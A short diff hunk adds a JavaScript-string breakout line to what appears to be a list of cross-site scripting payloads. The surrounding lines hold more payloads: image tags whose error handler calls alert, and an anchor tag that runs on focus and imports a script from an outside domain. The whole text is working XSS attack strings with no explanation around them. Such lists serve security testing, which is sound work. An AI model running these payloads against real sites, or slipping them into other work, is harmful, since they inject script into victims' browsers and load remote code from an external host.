@@ -1,3 +1,4 @@
+";}alert(1);function%20test(){"
 <Img/Src/OnError=(alert)(1)>
 OnXSS=<Img/Src/OnError=(alert)(1)>
 <A HRef=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
